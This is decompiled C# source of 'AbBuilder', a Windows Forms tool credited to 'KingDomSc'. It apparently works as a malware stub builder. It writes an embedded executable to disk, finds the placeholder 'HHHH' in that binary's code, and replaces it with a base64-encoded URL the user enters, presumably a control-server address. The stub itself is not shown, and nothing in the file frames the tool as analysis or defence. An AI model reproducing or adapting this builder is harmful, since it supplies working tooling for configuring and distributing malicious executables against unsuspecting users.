using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using AbBuilder.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Mono.Cecil;
using Mono.Cecil.Cil;
using Mono.Collections.Generic;

namespace AbBuilder
{
	// Token: 0x02000008 RID: 8
	[DesignerGenerated]
	public partial class Form1 : Form
	{
		// Token: 0x06000020 RID: 32 RVA: 0x0000EBA4 File Offset: 0x0000CFA4
		[DebuggerNonUserCode]
		public Form1()
		{
			Form1.__ENCAddToList(this);
			this.InitializeComponent();
		}

		// Token: 0x06000021 RID: 33 RVA: 0x0000EBBC File Offset: 0x0000CFBC
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Form1.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = Form1.__ENCList.Count == Form1.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int num2 = 0;
						int num3 = Form1.__ENCList.Count - 1;
						int num4 = num2;
						for (;;)
						{
							int num5 = num4;
							int num6 = num3;
							if (num5 > num6)
							{
								break;
							}
							WeakReference weakReference = Form1.__ENCList[num4];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num4 != num;
								if (flag2)
								{
									Form1.__ENCList[num] = Form1.__ENCList[num4];
								}
								num++;
							}
							num4++;
						}
						Form1.__ENCList.RemoveRange(num, Form1.__ENCList.Count - num);
						Form1.__ENCList.Capacity = Form1.__ENCList.Count;
					}
					Form1.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		// Token: 0x17000008 RID: 8
		// (get) Token: 0x06000024 RID: 36 RVA: 0x0000EFD4 File Offset: 0x0000D3D4
		// (set) Token: 0x06000025 RID: 37 RVA: 0x0000EFEC File Offset: 0x0000D3EC
		internal virtual TextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox1 = value;
			}
		}

		// Token: 0x17000009 RID: 9
		// (get) Token: 0x06000026 RID: 38 RVA: 0x0000EFF8 File Offset: 0x0000D3F8
		// (set) Token: 0x06000027 RID: 39 RVA: 0x0000F010 File Offset: 0x0000D410
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				flag = (this._Button1 != null);
				if (flag)
				{
					this._Button1.Click += value2;
				}
			}
		}

		// Token: 0x1700000A RID: 10
		// (get) Token: 0x06000028 RID: 40 RVA: 0x0000F070 File Offset: 0x0000D470
		// (set) Token: 0x06000029 RID: 41 RVA: 0x0000F088 File Offset: 0x0000D488
		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		// Token: 0x1700000B RID: 11
		// (get) Token: 0x0600002A RID: 42 RVA: 0x0000F094 File Offset: 0x0000D494
		// (set) Token: 0x0600002B RID: 43 RVA: 0x0000F0AC File Offset: 0x0000D4AC
		internal virtual Button Button2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button2_Click);
				bool flag = this._Button2 != null;
				if (flag)
				{
					this._Button2.Click -= value2;
				}
				this._Button2 = value;
				flag = (this._Button2 != null);
				if (flag)
				{
					this._Button2.Click += value2;
				}
			}
		}

		// Token: 0x0600002C RID: 44 RVA: 0x0000F10C File Offset: 0x0000D50C
		public string c(string str)
		{
			return Convert.ToBase64String(Encoding.Default.GetBytes(str));
		}

		// Token: 0x0600002D RID: 45 RVA: 0x0000F130 File Offset: 0x0000D530
		private void Button1_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(Strings.Trim(this.TextBox1.Text), null, false) != 0;
			if (flag)
			{
				SaveFileDialog saveFileDialog = new SaveFileDialog();
				saveFileDialog.Title = "Select Save File Path ..";
				saveFileDialog.Filter = "Application (*.exe)|*.exe";
				flag = (saveFileDialog.ShowDialog() == DialogResult.OK);
				if (flag)
				{
					byte[] windowsApplication = Resources.WindowsApplication710;
					File.WriteAllBytes(saveFileDialog.FileName, windowsApplication);
					Thread.Sleep(1000);
					string text = null;
					flag = this.TextBox1.Text.ToLower().EndsWith("/");
					if (flag)
					{
						text = this.TextBox1.Text;
					}
					else
					{
						text = this.TextBox1.Text + "/";
					}
					text = this.c(text);
					AssemblyDefinition assemblyDefinition = AssemblyDefinition.ReadAssembly(saveFileDialog.FileName);
					try
					{
						foreach (TypeDefinition typeDefinition in assemblyDefinition.MainModule.GetTypes())
						{
							try
							{
								foreach (MethodDefinition methodDefinition in typeDefinition.Methods)
								{
									try
									{
										foreach (Instruction instruction in methodDefinition.Body.Instructions)
										{
											try
											{
												flag = Operators.ConditionalCompareObjectEqual(instruction.Operand, null, false);
												if (!flag)
												{
													flag = Operators.ConditionalCompareObjectEqual(instruction.Operand, "HHHH", false);
													if (flag)
													{
														instruction.Operand = text;
														goto IL_1F6;
													}
												}
											}
											catch (Exception ex)
											{
											}
										}
									}
									finally
									{
										Collection<Instruction>.Enumerator enumerator3;
										((IDisposable)enumerator3).Dispose();
									}
								}
							}
							finally
							{
								Collection<MethodDefinition>.Enumerator enumerator2;
								((IDisposable)enumerator2).Dispose();
							}
						}
					}
					finally
					{
						IEnumerator<TypeDefinition> enumerator;
						flag = (enumerator != null);
						if (flag)
						{
							enumerator.Dispose();
						}
					}
					IL_1F6:
					assemblyDefinition.Write(saveFileDialog.FileName);
					Interaction.MsgBox("Done Create File in :\r\n" + saveFileDialog.FileName, MsgBoxStyle.Information, "Information");
				}
			}
		}

		// Token: 0x0600002E RID: 46 RVA: 0x0000F3C8 File Offset: 0x0000D7C8
		private void Button2_Click(object sender, EventArgs e)
		{
			Interaction.MsgBox(this.Text + "\r\n\r\nCreated By : KingDomSc .\r\nSkype : KingDomSc .", MsgBoxStyle.Information, "About");
		}

		// Token: 0x0400000A RID: 10
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x0400000C RID: 12
		[AccessedThroughProperty("TextBox1")]
		private TextBox _TextBox1;

		// Token: 0x0400000D RID: 13
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x0400000E RID: 14
		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		// Token: 0x0400000F RID: 15
		[AccessedThroughProperty("Button2")]
		private Button _Button2;
	}
}
